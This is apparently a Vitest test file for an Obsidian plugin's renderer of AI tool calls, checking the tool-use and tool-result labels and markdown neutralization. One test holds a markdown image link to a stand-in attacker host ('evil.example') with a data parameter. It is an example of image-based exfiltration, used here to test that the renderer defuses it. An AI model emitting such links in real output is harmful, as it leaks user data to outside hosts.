import { describe, expect, it, vi } from 'vitest';
import { MarkdownRenderer } from 'obsidian';
import {
  describeToolResult,
  describeToolUse,
  renderMarkdownInto,
} from './block-renderer';

vi.mock('obsidian', async (importOriginal) => ({
  ...(await importOriginal<object>()),
  MarkdownRenderer: { render: vi.fn() },
}));

describe('renderMarkdownInto', () => {
  it('hands the renderer neutralized text', async () => {
    const el = { addClass: vi.fn() } as unknown as HTMLElement;
    const ctx = { app: {}, component: {} } as Parameters<typeof renderMarkdownInto>[2];
    await renderMarkdownInto(el, 'Done ![](https://evil.example/p?d=x)', ctx);
    const md = vi.mocked(MarkdownRenderer.render).mock.calls[0][1];
    expect(md).toBe('Done !\u200b[](https://evil.example/p?d=x)');
  });
});

describe('describeToolUse', () => {
  it('renders read_note with the path', () => {
    expect(describeToolUse('read_note', { path: 'notes/foo.md' })).toBe(
      '📖 Reading notes/foo.md',
    );
  });

  it('renders read_note with placeholder when path missing', () => {
    expect(describeToolUse('read_note', {})).toBe('📖 Reading ?');
  });

  it('renders list_notes with folder + limit when present', () => {
    expect(
      describeToolUse('list_notes', { folder: 'inbox', limit: 5 }),
    ).toBe('📋 Listing notes in `inbox` (limit 5)');
  });

  it('renders list_notes bare without folder/limit', () => {
    expect(describeToolUse('list_notes', {})).toBe('📋 Listing notes');
  });

  it('renders search_vault with the query in quotes', () => {
    expect(describeToolUse('search_vault', { query: 'walkable' })).toBe(
      '🔍 Searching vault for "walkable"',
    );
  });

  it('renders web_search / web_fetch with the relevant param', () => {
    expect(describeToolUse('web_search', { query: 'sf coffee' })).toBe(
      '🌐 Web search: "sf coffee"',
    );
    expect(
      describeToolUse('web_fetch', { url: 'https://example.com' }),
    ).toBe('🌐 Fetching https://example.com');
  });

  it('renders write/edit/append with the target path', () => {
    expect(describeToolUse('write_note', { path: 'a.md' })).toBe(
      '✏️ Write a.md',
    );
    expect(describeToolUse('edit_note', { path: 'b.md' })).toBe(
      '✏️ Edit b.md',
    );
    expect(describeToolUse('append_to_note', { path: 'c.md' })).toBe(
      '➕ Append to c.md',
    );
  });

  it('falls back to "🔧 <name>" for unknown tools', () => {
    expect(describeToolUse('custom_tool', { foo: 'bar' })).toBe(
      '🔧 custom_tool',
    );
  });

  it('handles undefined input without throwing', () => {
    expect(describeToolUse('read_note', undefined)).toBe('📖 Reading ?');
  });
});

describe('describeToolResult', () => {
  it('flags errors regardless of content', () => {
    expect(describeToolResult('anything', true)).toBe('⚠️ tool error');
  });

  it('shows "✓ result (empty)" for empty string content', () => {
    expect(describeToolResult('', false)).toBe('✓ result (empty)');
    expect(describeToolResult('   ', false)).toBe('✓ result (empty)');
  });

  it('shows the first line for single-line content', () => {
    expect(describeToolResult('Hello world', false)).toBe('✓ Hello world');
  });

  it('truncates long first lines at 80 chars with an ellipsis', () => {
    const long = 'a'.repeat(100);
    const out = describeToolResult(long, false);
    expect(out.length).toBeLessThanOrEqual(82); // "✓ " + 80
    expect(out.endsWith('…')).toBe(true);
  });

  it('appends " …" hint when content has more lines beyond the first', () => {
    expect(describeToolResult('line one\nline two', false)).toBe(
      '✓ line one …',
    );
  });

  it('falls back for non-string content', () => {
    expect(describeToolResult({ foo: 'bar' }, false)).toBe('✓ tool result');
    expect(describeToolResult(null, false)).toBe('✓ tool result');
  });
});
